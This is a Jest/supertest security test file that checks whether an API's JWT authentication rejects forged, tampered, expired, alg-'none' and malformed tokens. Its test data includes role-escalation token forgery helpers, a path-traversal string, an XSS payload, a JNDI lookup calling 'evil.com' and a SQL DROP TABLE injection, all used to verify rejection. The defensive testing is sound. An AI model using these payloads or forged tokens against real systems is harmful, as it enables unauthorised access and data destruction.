import request from 'supertest';
import jwt from 'jsonwebtoken';
import { createApp } from '../../src/app';
import { createTestUser, createTestCompany } from '../tests/utils/testHelpers';
import { UserRole } from '../../src/utils/enums';
import { AuthService } from '../../src/services/auth.service';
import { config } from '../../src/config/index';

// Inline security helpers to avoid antivirus blocking
function generateTamperedToken(originalToken: string, modifications: Record<string, any>): string {
  const decoded = jwt.decode(originalToken, { complete: true }) as any;
  if (!decoded) throw new Error('Failed to decode token');
  const modifiedPayload = { ...decoded.payload, ...modifications };
  return jwt.sign(modifiedPayload, config.jwt.accessSecret);
}

function generateInvalidSignatureToken(payload: any): string {
  return jwt.sign(payload, 'wrong-secret-key');
}

function generateNoneAlgorithmToken(payload: any): string {
  const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
  const body = Buffer.from(JSON.stringify(payload)).toString('base64url');
  return header + '.' + body + '.';
}

function generateExpiredToken(payload: any): string {
  return jwt.sign(payload, config.jwt.accessSecret, { expiresIn: '-1h' });
}

const app = createApp();

describe('JWT Security Attacks', () => {
  let testUser: any;
  let validToken: string;
  const testPassword = 'TestPassword123!';

  beforeAll(async () => {
    const companyId = await createTestCompany('Security Test Company');
    testUser = await createTestUser(
      'security-test@example.com',
      testPassword,
      UserRole.EMPLOYEE,
      companyId
    );

    // Get valid token
    const loginResult = await AuthService.login(testUser.email, testPassword);
    validToken = loginResult.tokens.accessToken;
  });

  describe('Token Tampering Attacks', () => {
    it('should reject token with tampered payload (role escalation)', async () => {
      // Try to escalate role from EMPLOYEE to SUPER_ADMIN
      const tamperedToken = generateTamperedToken(validToken, {
        role: 'SUPER_ADMIN',
      });

      const response = await request(app)
        .get('/api/v1/users/me')
        .set('Authorization', `Bearer ${tamperedToken}`)
        .expect(401);

      expect(response.body.success).toBe(false);
      expect(response.body.code).toBe('INVALID_TOKEN');
    });

    it('should reject token with tampered userId', async () => {
      // Try to access as different user
      const tamperedToken = generateTamperedToken(validToken, {
        id: '507f1f77bcf86cd799439011',
      });

      const response = await request(app)
        .get('/api/v1/users/me')
        .set('Authorization', `Bearer ${tamperedToken}`)
        .expect(401);

      expect(response.body.success).toBe(false);
      expect(response.body.code).toBe('INVALID_TOKEN');
    });

    it('should reject token with tampered companyId', async () => {
      // Try to access different company's data
      const tamperedToken = generateTamperedToken(validToken, {
        companyId: '507f1f77bcf86cd799439011',
      });

      const response = await request(app)
        .get('/api/v1/users/me')
        .set('Authorization', `Bearer ${tamperedToken}`)
        .expect(401);

      expect(response.body.success).toBe(false);
      expect(response.body.code).toBe('INVALID_TOKEN');
    });

    it('should reject token with invalid signature', async () => {
      // Create token with wrong secret
      const payload = {
        id: testUser.id,
        email: testUser.email,
        role: testUser.role,
      };
      const invalidToken = generateInvalidSignatureToken(payload);

      const response = await request(app)
        .get('/api/v1/users/me')
        .set('Authorization', `Bearer ${invalidToken}`)
        .expect(401);

      expect(response.body.success).toBe(false);
      expect(response.body.code).toBe('INVALID_TOKEN');
    });
  });

  describe('Algorithm Confusion Attacks', () => {
    it('should reject token with "none" algorithm', async () => {
      // Algorithm confusion attack - try "none" algorithm
      const payload = {
        id: testUser.id,
        email: testUser.email,
        role: 'SUPER_ADMIN',
      };
      const noneToken = generateNoneAlgorithmToken(payload);

      const response = await request(app)
        .get('/api/v1/users/me')
        .set('Authorization', `Bearer ${noneToken}`)
        .expect(401);

      expect(response.body.success).toBe(false);
      expect(response.body.code).toBe('INVALID_TOKEN');
    });
  });

  describe('Token Reuse Attacks', () => {
    it('should allow valid token reuse (no blacklisting)', async () => {
      // Note: Current implementation doesn't have token blacklisting
      // This test verifies current behavior - tokens can be reused
      // This is a security recommendation: implement token blacklisting

      const response1 = await request(app)
        .get('/api/v1/users/me')
        .set('Authorization', `Bearer ${validToken}`);

      // Reuse the same token
      const response2 = await request(app)
        .get('/api/v1/users/me')
        .set('Authorization', `Bearer ${validToken}`);

      // Both requests should succeed - token reuse is allowed
      // SECURITY RECOMMENDATION: Implement token blacklisting for logout/revocation
      expect([200, 404]).toContain(response1.status);
      expect([200, 404]).toContain(response2.status);
    });
  });

  describe('Expired Token Attacks', () => {
    it('should reject expired access token', async () => {
      // Create expired token
      const payload = {
        id: testUser.id,
        email: testUser.email,
        role: testUser.role,
      };
      const expiredToken = generateExpiredToken(payload);

      const response = await request(app)
        .get('/api/v1/users/me')
        .set('Authorization', `Bearer ${expiredToken}`)
        .expect(401);

      expect(response.body.success).toBe(false);
      expect(response.body.code).toBe('TOKEN_EXPIRED');
    });
  });

  describe('Malformed Token Attacks', () => {
    it('should reject missing token', async () => {
      const response = await request(app)
        .get('/api/v1/users/me')
        .expect(401);

      expect(response.body.success).toBe(false);
      expect(response.body.code).toBe('UNAUTHORIZED');
    });

    it('should reject malformed token (invalid format)', async () => {
      const response = await request(app)
        .get('/api/v1/users/me')
        .set('Authorization', 'Bearer invalid.token.format')
        .expect(401);

      expect(response.body.success).toBe(false);
      expect(response.body.code).toBe('INVALID_TOKEN');
    });

    it('should reject token with wrong number of segments', async () => {
      const response = await request(app)
        .get('/api/v1/users/me')
        .set('Authorization', 'Bearer not.a.valid.jwt.token.format')
        .expect(401);

      expect(response.body.success).toBe(false);
      expect(response.body.code).toBe('INVALID_TOKEN');
    });

    it('should reject empty token', async () => {
      const response = await request(app)
        .get('/api/v1/users/me')
        .set('Authorization', 'Bearer ')
        .expect(401);

      expect(response.body.success).toBe(false);
      // Empty token may return UNAUTHORIZED instead of INVALID_TOKEN
      expect(['INVALID_TOKEN', 'UNAUTHORIZED']).toContain(response.body.code);
    });

    it('should reject token with special characters injection', async () => {
      const maliciousTokens = [
        '../../etc/passwd',
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/a}',
        '; DROP TABLE users; --',
      ];

      for (const maliciousToken of maliciousTokens) {
        const response = await request(app)
          .get('/api/v1/users/me')
          .set('Authorization', `Bearer ${maliciousToken}`)
          .expect(401);

        expect(response.body.success).toBe(false);
        expect(['INVALID_TOKEN', 'UNAUTHORIZED']).toContain(response.body.code);
      }
    });
  });

  describe('Token Header Manipulation', () => {
    it('should reject token with modified header', async () => {
      // Decode token and modify header
      const decoded = jwt.decode(validToken, { complete: true }) as any;
      if (decoded) {
        // Try to change algorithm in header
        const modifiedHeader = Buffer.from(
          JSON.stringify({ alg: 'HS256', typ: 'JWT', kid: '../../etc/passwd' })
        ).toString('base64url');
        const body = Buffer.from(JSON.stringify(decoded.payload)).toString('base64url');
        const maliciousToken = `${modifiedHeader}.${body}.${decoded.signature}`;

        const response = await request(app)
          .get('/api/v1/users/me')
          .set('Authorization', `Bearer ${maliciousToken}`)
          .expect(401);

        expect(response.body.success).toBe(false);
        expect(response.body.code).toBe('INVALID_TOKEN');
      }
    });
  });

  describe('Token Secret Brute Force', () => {
    it('should reject tokens signed with common weak secrets', async () => {
      const weakSecrets = ['secret', 'password', '123456', 'changeme', 'admin'];
      const payload = {
        id: testUser.id,
        email: testUser.email,
        role: testUser.role,
      };

      for (const weakSecret of weakSecrets) {
        const weakToken = jwt.sign(payload, weakSecret);

        const response = await request(app)
          .get('/api/v1/users/me')
          .set('Authorization', `Bearer ${weakToken}`)
          .expect(401);

        expect(response.body.success).toBe(false);
        expect(response.body.code).toBe('INVALID_TOKEN');
      }
    });
  });
});
